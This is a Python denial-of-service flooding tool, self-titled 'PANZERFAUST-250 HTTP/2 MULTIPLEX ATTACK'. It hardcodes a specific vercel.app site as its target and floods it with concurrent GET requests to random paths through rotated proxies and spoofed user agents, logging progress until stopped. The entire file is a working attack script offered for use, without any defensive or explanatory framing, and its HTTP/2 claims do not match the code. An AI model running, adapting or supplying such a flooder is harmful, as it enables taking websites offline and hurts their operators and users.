import asyncio
import aiohttp
import sys
import signal
import random
import time
from datetime import datetime

# ================= CONFIG =================
TARGET = "https://sts-network.vercel.app/"  # CHANGE THIS
PROXY_FILE = "proxies.txt"
MAX_CONNECTIONS = 10  # HTTP/2 connections
STREAMS_PER_CONN = 100  # Concurrent streams per connection
# ==========================================

running = True
total_requests = 0
last_status = 200
last_log_time = time.time()

# Color codes for logging
COLORS = {
    'reset': '\033[0m',
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m'
}

class HTTP2Client:
    def __init__(self, proxy):
        self.proxy = proxy
        self.session = None
        self.connector = None
        
    async def connect(self):
        """Create HTTP/2 connection"""
        try:
            # HTTP/2 with proxy support
            connector = aiohttp.TCPConnector(
                limit=0,
                force_close=True,
                enable_cleanup_closed=True,
                ssl=False
            )
            
            timeout = aiohttp.ClientTimeout(total=30)
            
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': self.random_ua()
                }
            )
            return True
        except Exception as e:
            return False
    
    def random_ua(self):
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ]
        return random.choice(agents)
    
    def random_path(self):
        """Generate random endpoint"""
        paths = ['/', '/api', '/v1', '/data', '/users', '/products',
                f'/{random.randint(1000,9999)}', f'/id/{random.randint(1,1000000)}',
                f'/search?q={random.randint(1,999999)}', '/admin', '/wp-content']
        return random.choice(paths)
    
    async def send_request(self):
        """Send single HTTP/2 request"""
        global total_requests, last_status
        
        if not self.session:
            return
        
        try:
            path = self.random_path()
            async with self.session.get(
                TARGET + path,
                proxy=self.proxy if self.proxy != 'direct' else None,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                last_status = response.status
                total_requests += 1
                
        except aiohttp.ClientError as e:
            total_requests += 1
            last_status = 0  # 0 for network error
        except Exception as e:
            total_requests += 1
            last_status = 0
    
    async def close(self):
        if self.session:
            await self.session.close()

def load_proxies():
    """Load proxies from file"""
    proxies = []
    try:
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    except FileNotFoundError:
        print(f"{COLORS['red']}[!] {PROXY_FILE} not found{COLORS['reset']}")
        print(f"{COLORS['yellow']}[*] Using direct connections{COLORS['reset']}")
        proxies = ['direct']
    
    # Use first 10 proxies or repeat if less
    if len(proxies) < MAX_CONNECTIONS:
        proxies = proxies * (MAX_CONNECTIONS // len(proxies) + 1)
    
    return proxies[:MAX_CONNECTIONS]

def log_status():
    """Log status every 10 seconds"""
    global last_log_time
    
    current_time = time.time()
    if current_time - last_log_time >= 10:
        last_log_time = current_time
        
        # Format the number with commas
        formatted_reqs = f"{total_requests:,}"
        
        # Color for status code
        if last_status == 0:
            status_color = COLORS['red']
            status_text = "ERR"
        elif 200 <= last_status < 300:
            status_color = COLORS['green']
            status_text = str(last_status)
        elif 300 <= last_status < 400:
            status_color = COLORS['yellow']
            status_text = str(last_status)
        elif 400 <= last_status < 500:
            status_color = COLORS['red']
            status_text = str(last_status)
        elif last_status >= 500:
            status_color = COLORS['red']
            status_text = str(last_status)
        else:
            status_color = COLORS['red']
            status_text = str(last_status)
        
        # Log format: PANZERFAUST-250:(requests) ----> (status)
        print(f"{COLORS['cyan']}PANZERFAUST-250{COLORS['reset']}:{COLORS['green']}{formatted_reqs}{COLORS['reset']} ----> {status_color}{status_text}{COLORS['reset']}")

async def connection_worker(client):
    """Worker that sends streams on a single connection"""
    while running:
        # Create batch of requests for this connection
        tasks = []
        for _ in range(STREAMS_PER_CONN):
            tasks.append(client.send_request())
        
        # Send batch concurrently
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Small delay to prevent CPU spinning
        await asyncio.sleep(0.01)
        
        # Log every 10 seconds
        log_status()

async def main():
    global running
    
    print(f"{COLORS['magenta']}[*] PANZERFAUST-250 HTTP/2 MULTIPLEX ATTACK{COLORS['reset']}")
    print(f"{COLORS['yellow']}[*] Target: {TARGET}{COLORS['reset']}")
    
    # Load proxies
    proxies = load_proxies()
    print(f"{COLORS['green']}[+] Using {len(proxies)} connections{COLORS['reset']}")
    
    # Create HTTP/2 clients
    clients = []
    for proxy in proxies:
        client = HTTP2Client(proxy)
        if await client.connect():
            clients.append(client)
            print(f"{COLORS['green']}[+] Connection established{COLORS['reset']}")
        else:
            print(f"{COLORS['red']}[!] Failed to connect{COLORS['reset']}")
    
    if not clients:
        print(f"{COLORS['red']}[!] No connections established. Exiting.{COLORS['reset']}")
        return
    
    print(f"{COLORS['green']}[+] Attack started. Logging every 10 seconds...{COLORS['reset']}")
    print("-" * 50)
    
    # Start workers
    workers = []
    for client in clients:
        worker = asyncio.create_task(connection_worker(client))
        workers.append(worker)
    
    # Keep running until interrupted
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        pass
    
    # Cleanup
    print(f"\n{COLORS['yellow']}[*] Cleaning up...{COLORS['reset']}")
    for client in clients:
        await client.close()

def signal_handler(sig, frame):
    global running
    print(f"\n{COLORS['red']}[!] Stopping attack...{COLORS['reset']}")
    running = False

if __name__ == "__main__":
    # Setup signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Check target
    if not TARGET.startswith(('http://', 'https://')):
        print(f"{COLORS['red']}[!] Target must start with http:// or https://{COLORS['reset']}")
        sys.exit(1)
    
    # Run attack
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{COLORS['red']}[!] Attack stopped by user{COLORS['reset']}")
    finally:
        print(f"{COLORS['magenta']}[*] Total requests sent: {total_requests:,}{COLORS['reset']}")
